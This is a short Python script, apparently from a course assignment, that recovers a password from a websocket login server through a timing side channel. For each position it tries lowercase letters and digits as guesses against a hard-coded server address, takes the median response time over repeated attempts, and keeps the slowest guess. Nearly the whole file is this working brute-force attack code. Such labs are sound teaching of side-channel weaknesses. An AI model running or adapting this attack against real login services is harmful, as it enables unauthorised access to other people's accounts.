import asyncio, websockets
from json import dumps, loads
from time import sleep, perf_counter
import string, statistics

async def client_connect(username, password, variance=0.10):
    """Handle sending and receiving logins to & from the server.
    'while True' structure prevents singular network/socket
    errors from causing full crash.

    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt
        variance -- float of maximum network delay

    Returns
    -------
        reply -- string of server's response to login attempt
    """

    server_address = "ws://20.224.193.77:8080"
    #server_address = "ws://127.0.0.1:8080"
    #server_address = "ws://192.168.178.190:3840"

    while True:
        try:
            async with websockets.connect(server_address) as websocket:
                await websocket.send(dumps([username,password,variance]))
                t0 = perf_counter()
                reply = await websocket.recv()
                t1 = perf_counter()
            return loads(reply), t1 - t0
        except:
            continue

def call_server(username, password, variance=0.001):
    """Send a login attempt of username + password to the server
    and return the response. Optionally takes the variable variance to
    allow simulation of random network delays; the server will then
    delay its response by n microseconds, where 0 < n < variance.
    A higher variance will make guessing the password harder.


    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt
        variance -- float of maximum delay, must be greater than 0.000001

    Returns
    -------
        reply -- string of server's response to login attempt
    """

    
    reply, duration = asyncio.run(client_connect(username, password, variance))
    sleep(0.001)
    return reply, duration


def score_guess(student, guess, samples=11):
    # warm-up
    call_server(student, guess)
    times = []

    for _ in range(samples):
        reply, duration = call_server(student, guess)
        times.append(duration)

    return reply, statistics.median(times)

# Test basic server connectivity & functionality
chars = string.ascii_lowercase + string.digits
gevonden = ""
results = []
password_length = 7
for c in chars:
        guess = (gevonden + c).ljust(password_length, "a")
        score, duration = score_guess("000000", guess)
        print(guess, c, duration)
        results.append((guess, c, duration))
        
print(results)

best = max(results, key=lambda x: x[2])

print(best)